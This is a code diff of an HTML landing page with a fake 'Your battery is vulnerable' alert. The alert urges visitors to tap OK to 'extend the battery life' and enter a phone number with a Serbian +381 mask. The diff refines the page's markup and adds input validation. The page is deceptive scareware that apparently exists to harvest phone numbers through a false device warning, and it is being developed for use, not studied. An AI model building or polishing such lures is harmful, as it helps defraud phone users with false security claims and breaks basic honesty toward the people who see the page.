@@ -4,28 +4,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
     <link rel="stylesheet" type="text/css" href="/css/style.css" />
+    <link rel="icon" type="image/x-icon" href="/img/favicon.ico">
     <script src="https://unpkg.com/imask"></script>
     <title>Battery is vulnerable</title>
 </head>
 <body>
-    <main>
-        <div class="popup">
-            <h1>Your battery is vulnerable</h1>
-            <h2>Tap "OK" to extend the battery life and maintain its overall health</h2>
-            <div class="popup__images">
-                <img src="/img/usb.svg" alt="usb"/>
-                <img src="/img/bat.svg" alt="battery"/>
-            </div>
-            <div class="popup__inputs">
-                <input type="text" required placeholder="+(381)___-___-__"/>
-                <button>OK</button>
-            </div>
-        </div>
-        <footer>
-            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Justo eget magna fermentum iaculis eu. Volutpat blandit aliquam etiam erat velit. Augue mauris augue neque gravida in. Duis at tellus at urna. Massa tincidunt nunc pulvinar sapien et. Pharetra pharetra massa massa ultricies mi quis hendrerit dolor. Faucibus vitae aliquet nec ullamcorper sit. Neque sodales ut etiam sit amet nisl purus in mollis. Pharetra magna ac placerat vestibulum lectus mauris. Amet massa vitae tortor condimentum lacinia quis. Dis parturient montes nascetur ridiculus mus mauris. Enim diam vulputate ut pharetra sit amet aliquam. Nunc mattis enim ut tellus elementum sagittis. Massa sed elementum tempus egestas sed. Velit dignissim sodales ut eu sem integer vitae justo. Arcu felis bibendum ut tristique et egestas quis ipsum. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Justo eget magna fermentum iaculis eu. Volutpat blandit aliquam etiam erat velit. Augue mauris augue neque gravida in. Duis at tellus at urna. Massa tincidunt nunc pulvinar sapien et. Pharetra pharetra massa massa ultricies mi quis hendrerit dolor. Faucibus vitae aliquet nec ullamcorper sit. Neque sodales ut etiam sit amet nisl purus in mollis. Pharetra magna ac placerat vestibulum lectus mauris. Amet massa vitae tortor condimentum lacinia quis. Dis parturient montes nascetur ridiculus mus mauris. Enim diam vulputate ut pharetra sit amet aliquam. Nunc mattis enim ut tellus elementum sagittis. Massa sed elementum tempus egestas sed. Velit dignissim sodales ut eu sem integer vitae justo. Arcu felis bibendum ut tristique et egestas quis ipsum.</p>
-        </footer>
-    </main>
 
+    <div class="popup">
+        <h1>Your battery is vulnerable</h1>
+        <h2>Tap "OK" to extend the battery life and maintain its overall health</h2>
+        <div class="popup__images">
+            <img src="/img/usb.svg" alt="usb"/>
+            <img src="/img/bat.svg" alt="battery"/>
+        </div>
+        <div class="popup__inputs">
+            <input id="phone-input" type="text" required placeholder="+(381)___-___-__"  />
+            <label id="label" for="phone-input">
+                <span>Invalid format specified</span>
+            </label>
+            <button onclick="validateInput()">
+                <a>OK</a>
+            </button>
+        </div>
+    </div>
+
+
+    <footer>
+        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Justo eget magna fermentum iaculis eu. Volutpat blandit aliquam etiam erat velit. Augue mauris augue neque gravida in. Duis at tellus at urna. Massa tincidunt nunc pulvinar sapien et. Pharetra pharetra massa massa ultricies mi quis hendrerit dolor. Faucibus vitae aliquet nec ullamcorper sit. Neque sodales ut etiam sit amet nisl purus in mollis. Pharetra magna ac placerat vestibulum lectus mauris. Amet massa vitae tortor condimentum lacinia quis. Dis parturient montes nascetur ridiculus mus mauris. Enim diam vulputate ut pharetra sit amet aliquam. Nunc mattis enim ut tellus elementum sagittis. Massa sed elementum tempus egestas sed. Velit dignissim sodales ut eu sem integer vitae justo. Arcu felis bibendum ut tristique et egestas quis ipsum. Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Justo eget magna fermentum iaculis eu. Volutpat blandit aliquam etiam erat velit. Augue mauris augue neque gravida in. Duis at tellus at urna. Massa tincidunt nunc pulvinar sapien et. Pharetra pharetra massa massa ultricies mi quis hendrerit dolor. Faucibus vitae aliquet nec ullamcorper sit. Neque sodales ut etiam sit amet nisl purus in mollis. Pharetra magna ac placerat vestibulum lectus mauris. Amet massa vitae tortor condimentum lacinia quis. Dis parturient montes nascetur ridiculus mus mauris. Enim diam vulputate ut pharetra sit amet aliquam. Nunc mattis enim ut tellus elementum sagittis. Massa sed elementum tempus egestas sed. Velit dignissim sodales ut eu sem integer vitae justo. Arcu felis bibendum ut tristique et egestas quis ipsum.</p>
+    </footer>
 </body>
 <script src="/js/script.js"></script>
 </html>
